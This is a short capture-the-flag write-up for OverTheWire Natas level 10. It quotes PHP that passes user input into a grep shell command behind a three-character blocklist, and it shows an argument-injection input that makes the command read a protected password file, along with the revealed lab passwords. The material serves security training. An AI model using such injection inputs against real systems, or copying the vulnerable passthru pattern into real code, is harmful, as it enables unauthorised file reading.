# Natas Level 10

```bash
Username: natas10
Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
URL:      http://natas10.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas10.png" />
    <div align="center">Natas 10</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas10-view-sourcecode.png" />
    <div align="center">Natas 10 - View sourcecode</div>
</figure>

The script is very similar to the last one, except the character filtering:
```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```
We need to avoid these 3 characters:
* ;
* |
* &

If we send the folloing: "1 /etc/natas_webpass/natas11".

This will result in the following [command](http://natas10.natas.labs.overthewire.org/?needle=1+%2Fetc%2Fnatas_webpass%2Fnatas11&amp;submit=Search):
```bash
grep -i 1 /etc/natas_webpass/natas11 dictionary.txt
```

Which will search for the pattern: "1" in both files: /etc/natas_webpass/natas11 and dictionary.txt
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas10-code-injection.png" />
    <div align="center">Natas 10 - Code injection</div>
</figure>

We were lucky, the password contains the substring: "1"

We got the password for the next level: **U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK**